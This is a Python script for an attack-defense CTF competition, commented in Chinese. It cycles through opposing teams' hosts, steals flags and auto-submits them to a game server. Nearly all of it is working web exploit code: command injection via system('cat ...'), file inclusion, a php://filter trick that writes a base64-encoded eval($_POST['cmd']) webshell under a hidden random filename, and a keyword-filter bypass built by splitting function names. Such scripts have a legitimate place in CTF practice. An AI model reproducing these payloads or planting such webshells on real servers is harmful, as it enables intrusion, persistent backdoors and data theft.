import requests
import re
import json
import socket
import time
import random

# ==================== 开局只需要填这 3 个位置 ====================
TOKEN     = "<submit token>"
HOST      = "<gameserver>"
FLAG_PATH = "/flag"     # <--- 等下找到靶机上存放 flag 的位置后填在这里 (如 /flag 或 /var/www/flag.txt)
# =================================================================

# 统一匹配 [A-Z0-9]{31}= 格式 (同时兼容 ihack26{...})
FLAG_PATTERN = re.compile(r"(?:[A-Z0-9]{31}=|ihack26\{[^}]+\})")


def extract_flag(text, target):
    """统一的提取 Flag 函数（自动一行一个写入 flags.txt）"""
    matches = FLAG_PATTERN.findall(text)
    if matches:
        res = matches[0]
        print('[+] Flag Found: ' + target + ' -> ' + res)
        with open("flags.txt", "a") as f:
            f.write(res + "\n")
        return res
    return None


def filename():
    return '.' + str(int(random.uniform(10000000, 99999999))) + '.php'


# 漏洞模板 1：POST 一句话木马 / 命令执行
def exp1(target):
    url = 'http://' + target + '/admin/test.php'
    data = {"cmd": f"system('cat {FLAG_PATH}');"}
    try:
        r = requests.post(url=url, data=data, timeout=3)
        return extract_flag(r.text, target)
    except Exception:
        return None


# 漏洞模板 2：GET 任意文件读取 / 命令执行
def exp2(target):
    url = 'http://' + target + f'/about.php?file={FLAG_PATH}'
    try:
        r = requests.get(url=url, timeout=3)
        return extract_flag(r.text, target)
    except Exception:
        return None


# 漏洞模板 3：POST 普通参数命令执行
def exp3(target):
    url = 'http://' + target + '/admin/editor.php'
    data = {"boy": f"cat {FLAG_PATH}"}
    try:
        r = requests.post(url=url, data=data, timeout=3)
        return extract_flag(r.text, target)
    except Exception:
        return None


# 漏洞模板 4：利用 php://filter 写入隐藏随机名木马再读 Flag
def exp4(target):
    Filename = filename()
    write_backdoor_url = 'http://' + target + '/admin/type.php?m=sPD9waHAgZXZhbChAJF9QT1NUWydjbWQnXSk7Pz4=&file=php://filter/write=convert.base64-decode/resource=' + Filename
    getflag_url = 'http://' + target + '/admin/' + Filename
    data = {"cmd": f"system('cat {FLAG_PATH}');"}
    try:
        requests.get(url=write_backdoor_url, timeout=3)
        print("[+] Backdoor is Written in: " + getflag_url)
        time.sleep(1)
        r = requests.post(url=getflag_url, data=data, timeout=3)
        return extract_flag(r.text, target)
    except Exception:
        return None


# 漏洞模板 5：字符串拼接绕过关键字过滤
def exp5(target):
    url = 'http://' + target + f'/admin/articlelist.php?a=cat%20{FLAG_PATH}&str=2;$a=sys.tem;$b=curr.ent;$a($b($b($GLOBALS)));'
    try:
        r = requests.get(url=url, timeout=3)
        return extract_flag(r.text, target)
    except Exception:
        return None


# 漏洞模板 6：直接访问隐藏文件读 Flag
def exp6(target):
    url = 'http://' + target + '/.aa'
    try:
        r = requests.get(url=url, timeout=3)
        return extract_flag(r.text, target)
    except Exception:
        return None


# 官方给的 PUT /flags 自动提交模块
def submit(flag_value):
    if not flag_value:
        return
    body = json.dumps([flag_value])
    req = (
        f"PUT /flags HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"X-Team-Token: {TOKEN}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
        f"{body}"
    )
    try:
        with socket.create_connection((HOST, 80), timeout=10) as s:
            s.sendall(req.encode())
            print("    -> Submit Result:", s.recv(4096).decode(errors="replace").splitlines()[-1])
    except Exception as e:
        print("    -> Submit Error:", e)


if __name__ == "__main__":
    ROUND_SECONDS = 120  # 2 分钟 (120 秒) 刷新一次新 Flag
    while True:
        start_time = time.time()
        print(f"\n=== 开始新一轮攻击 ({time.strftime('%H:%M:%S')}) ===")
        for i in range(1, 15):
            # 记得跳过你们自己队伍的编号 (例如自己是 5 号队: if i == 5: continue)
            ip = "10.10.1.{}".format(i)

            # 用哪个漏洞就把哪个前面的 # 删掉：
            # flag = exp1(ip)
            flag = exp2(ip)
            # flag = exp3(ip)
            # flag = exp4(ip)
            # flag = exp5(ip)
            # flag = exp6(ip)

            if flag:
                submit(flag)

            # 【强制遵守规则】每次打完一个队伍必须停顿 >= 2 秒！
            time.sleep(2.5)

        elapsed = time.time() - start_time
        wait_sec = max(5, int(ROUND_SECONDS - elapsed))
        print(f"[*] 本轮耗时 {int(elapsed)} 秒，休息 {wait_sec} 秒对齐 2 分钟新 Flag...")
        time.sleep(wait_sec)
